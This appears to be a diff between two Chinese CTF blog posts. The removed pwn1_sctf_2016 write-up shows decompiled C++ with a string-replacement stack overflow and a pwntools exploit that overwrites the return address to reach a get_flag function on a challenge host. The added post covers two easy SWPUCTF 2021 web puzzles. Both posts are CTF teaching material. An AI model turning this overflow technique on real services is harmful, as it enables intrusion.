@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2022/09/19/pwn1-sctf-2016/"/>
+  <link rel="canonical" href="http://example.com/2022/11/14/swpuctf-2021-新生赛/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -31,19 +31,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>pwn1_sctf_2016 - Chen</title>
+  <title>SWPUCTF 2021 新生赛 - Chen</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="ChenBlog - Chen - Chen">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn1_sctf_2016">
-<meta property="og:url" content="http://example.com/2022/09/19/pwn1-sctf-2016/index.html">
+<meta property="og:title" content="SWPUCTF 2021 新生赛">
+<meta property="og:url" content="http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/index.html">
 <meta property="og:site_name" content="Chen">
-<meta property="og:description" content="buuctf中的一题，纯纯烧杯题，这题注重考查c++逆向(但是我还是觉得是动手调试的能力) 老规矩了，checksec看一下保护机制和位数  感觉像是栈溢出，不确定，ida看看  哇，看到这函数列表懵逼了，不过别怕，仔细翻一番  逮到三个看名字有用的，f5看一下 main函数： 12345int __cdecl main(int argc, const char **argv, const cha">
+<meta property="og:description" content="这篇用来记录SWPUCTF 2021 新生赛刷题记录 gift_F12123456789101112131415161718192021&lt;script language&#x3D;&quot;javascript&quot;&gt;    function show_date_time() &amp;#123;        flag &#x3D; &quot;WLLMCTF&amp;#123;We1c0me_t0_WLLMC">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-09-19T12:00:48.000Z">
-<meta property="article:modified_time" content="2022-09-19T12:22:52.824Z">
+<meta property="article:published_time" content="2022-11-14T03:12:53.000Z">
+<meta property="article:modified_time" content="2022-11-14T04:01:24.617Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2362,7 +2362,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/19/pwn1-sctf-2016/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/14/SWPUCTF-2021-新生赛/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Chen">
   </span>
@@ -2383,7 +2383,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        pwn1_sctf_2016
+        SWPUCTF 2021 新生赛
       </h1>
       <div class='new-meta-box'>
         
@@ -2402,10 +2402,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/wp/">wp</a>
+    <a class="category-link" href="/categories/web/">web</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/wp/" itemprop="url"><span itemprop="name">wp</span></a>
+        <a href="/categories/web/" itemprop="url"><span itemprop="name">web</span></a>
       </span>
     
   </div>
@@ -2414,10 +2414,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-09-19T20:00:48+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-11-14T11:12:53+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Sep 19, 2022</p>
+    <p>发布于：Nov 14, 2022</p>
   </a>
 </div>
 
@@ -2440,40 +2440,17 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>buuctf中的一题，纯纯烧杯题，这题注重考查c++逆向(但是我还是觉得是动手调试的能力)</p>
-<p>老规矩了，checksec看一下保护机制和位数</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/2DUZ0"><img src="https://s1.328888.xyz/2022/09/19/2DUZ0.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/19/2DUZ0.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2DUZ0.png"></a></p>
-<p>感觉像是栈溢出，不确定，ida看看</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/2DyqF"><img src="https://s1.328888.xyz/2022/09/19/2DyqF.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/19/2DyqF.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2DyqF.png"></a></p>
-<p>哇，看到这函数列表懵逼了，不过别怕，仔细翻一番</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/2DQK5"><img src="https://s1.328888.xyz/2022/09/19/2DQK5.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/19/2DQK5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2DQK5.png"></a></p>
-<p>逮到三个看名字有用的，f5看一下</p>
-<p><strong>main函数：</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <p>这篇用来记录SWPUCTF 2021 新生赛刷题记录</p>
+<h2 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_date_time</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        flag = <span class="string">&quot;WLLMCTF&#123;We1c0me_t0_WLLMCTF_Th1s_1s_th3_G1ft&#125;&quot;</span><span class="comment">//flag is here</span></span><br><span class="line">        window.<span class="title function_ invoke__">setTimeout</span>(<span class="string">&quot;show_date_time()&quot;</span>, <span class="number">1000</span>);</span><br><span class="line">        BirthDay = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;10/23/2021 00:00:00&quot;</span>);</span><br><span class="line">        today = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        timeold = (BirthDay.<span class="title function_ invoke__">getTime</span>() - today.<span class="title function_ invoke__">getTime</span>());</span><br><span class="line">        sectimeold = timeold / <span class="number">1000</span></span><br><span class="line">        secondsold = Math.<span class="title function_ invoke__">floor</span>(sectimeold);</span><br><span class="line">        msPerDay = <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span></span><br><span class="line">        e_daysold = timeold / msPerDay</span><br><span class="line">        daysold = Math.<span class="title function_ invoke__">floor</span>(e_daysold);</span><br><span class="line">        e_hrsold = (e_daysold - daysold) * <span class="number">24</span>;</span><br><span class="line">        hrsold = Math.<span class="title function_ invoke__">floor</span>(e_hrsold);</span><br><span class="line">        e_minsold = (e_hrsold - hrsold) * <span class="number">60</span>;</span><br><span class="line">        minsold = Math.<span class="title function_ invoke__">floor</span>((e_hrsold - hrsold) * <span class="number">60</span>);</span><br><span class="line">        seconds = Math.<span class="title function_ invoke__">floor</span>((e_minsold - minsold) * <span class="number">60</span>);</span><br><span class="line">        span_dt_dt.innerHTML = <span class="string">&quot;还有：&quot;</span>+ daysold + <span class="string">&quot;天  &quot;</span> + hrsold + <span class="string">&quot;小时  &quot;</span> + minsold + <span class="string">&quot;分钟  &quot;</span> + seconds + <span class="string">&quot;秒  &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">show_date_time</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<p><strong>vuln函数：</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, edata);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=();</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v6, s);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v5, <span class="string">&quot;you&quot;</span>, &amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(v8, v2);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v7, <span class="string">&quot;I&quot;</span>, v8);</span><br><span class="line">  replace((<span class="built_in">std</span>::<span class="built_in">string</span> *)v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;input, v4, v7, v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v7);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(v8);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v5);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v6);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看网页源码后找到flag</p>
+<h2 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>gatflag函数：</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>看完人更傻了，虽然getflag明显就是要我们栈溢出，跳转到这个函数，但是vuln写的是什么？</p>
-<p>百度完应该是c++中std::string相关的用法</p>
-<p>不过这题应该是要我们会用<strong>debug</strong>来调试程序</p>
-<p>我们重点注意一下那一串天书里面的“I”和“you”，突破口肯定是这俩</p>
-<p>浅写段exp，debug看看有什么玄机</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29397</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span>  <span class="comment">#这段就是打开debug，具体是什么，下面看到图你就知道了</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">6</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/2FDMk"><img src="https://s1.328888.xyz/2022/09/19/2FDMk.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/19/2FDMk.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2FDMk.png"></a></p>
-<p>好家伙，我们可以看到明明传的是I，结果都变成了you，那到这里很明显了，这题就是把字符串中的i替换成了you</p>
-<p>我们再来看看能不能进行栈溢出</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/2Fucw"><img src="https://s1.328888.xyz/2022/09/19/2Fucw.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/19/2Fucw.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2Fucw.png"></a></p>
-<p>可以看到，我们只能输入0x20字节的数据给s，但是他距离ebp有0x3c，不够怎么办？</p>
-<p>刚才不是输入I可以变成you吗？这不是一个字节顶三个字节，一节更比一节强（南孚打钱）</p>
-<p>那思路很明显了，输入20个字长的I，就相当于输入了60个字长的you，我们就可以进行栈溢出了</p>
-<p><strong>exp:</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29397</span>)</span><br><span class="line">getflag_addr = <span class="number">0x8048f0d</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+cyclic(<span class="number">4</span>)+p32(getflag_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure>
-
+<p>打开靶机后 给了一段源码</p>
+<p>id需要post传参 x需要json传参</p>
+<p>json传参格式 {“name”:”test”}</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/zkHk5Q"><img src="https://s1.ax1x.com/2022/11/14/zkHk5Q.png" class="lazyload" data-srcset="https://s1.ax1x.com/2022/11/14/zkHk5Q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="zkHk5Q.png"></a></p>
+<p>成功得到flag</p>
 
   </div>
   
@@ -2498,10 +2475,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-09-19T20:22:52+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-11-14T12:01:24+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Sep 19, 2022</p>
+    <p>更新于：Nov 14, 2022</p>
   </a>
 </div>
 
@@ -2520,7 +2497,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/09/19/pwn1-sctf-2016/&title=pwn1_sctf_2016 - Chen&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/&title=SWPUCTF 2021 新生赛 - Chen&summary="
           
           >
           
@@ -2532,7 +2509,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/09/19/pwn1-sctf-2016/&title=pwn1_sctf_2016 - Chen&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/&title=SWPUCTF 2021 新生赛 - Chen&summary="
           
           >
           
@@ -2544,7 +2521,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/09/19/pwn1-sctf-2016/&title=pwn1_sctf_2016 - Chen&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/&title=SWPUCTF 2021 新生赛 - Chen&summary="
           
           >
           
@@ -2577,20 +2554,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/09/21/Ret2shellcode/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>Ret2shellcode</p>
-          <p class='content'>这次我们再来介绍一个栈的经典题型
-在我们先前遇到的题目中，都有着出题人为我们提供的后门函数，如果没有后门函数，我们又该如何自己构建shellcode呢？
-带着这个疑问，我们开始今天的学习
-如何写...</p>
-        </a>
       
-      
-        <a class='next' href='/2022/09/18/%E6%A0%88%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862/'>
-          <p class='title'>栈的基础知识2<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>想了想还是专门列一个板块来详讲虚拟内存和栈的详细结构，刚好自己这块的了解也是一知半解的，顺便扫盲一下
-cpu缓存从这个问题开始入手整个知识点体系吧
-通常情况下，我们可以用cache的大小来区分一...</p>
+        <a class='next' href='/2022/11/14/babyheap-0ctf-2017/'>
+          <p class='title'>babyheap_0ctf_2017<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>查看一下保护机制
+12345Arch:     amd64-64-littleRELRO:    Full RELROstack:    Canary foundNX:       NX ena...</p>
         </a>
       
     </div>
@@ -2606,7 +2574,7 @@ cpu缓存从这个问题开始入手整个知识点体系吧
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2022/09/19/pwn1-sctf-2016/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2638,9 +2606,19 @@ cpu缓存从这个问题开始入手整个知识点体系吧
   
 
 
-  <div class="">
-    <!-- pjax占位 -->
-  </div>
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#gift-F12"><span class="toc-text">gift_F12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jicao"><span class="toc-text">jicao</span></a></li></ol>
+    </div>
+  </section>
 
   
 
@@ -3212,7 +3190,7 @@ cpu缓存从这个问题开始入手整个知识点体系吧
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/wp/","name":"wp"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/09/19/pwn1-sctf-2016/","name":"pwn1_sctf_2016"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"pwn1_sctf_2016","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/09/19/pwn1-sctf-2016/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/09/19/pwn1-sctf-2016/","wordCount":0,"datePublished":"2022-09-19T12:00:48.000Z","dateModified":"2022-09-19T12:22:52.824Z","articleSection":"wp","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/web/","name":"web"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/11/14/SWPUCTF-2021-新生赛/","name":"SWPUCTF 2021 新生赛"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SWPUCTF 2021 新生赛","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/11/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/","wordCount":0,"datePublished":"2022-11-14T03:12:53.000Z","dateModified":"2022-11-14T04:01:24.617Z","articleSection":"web","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
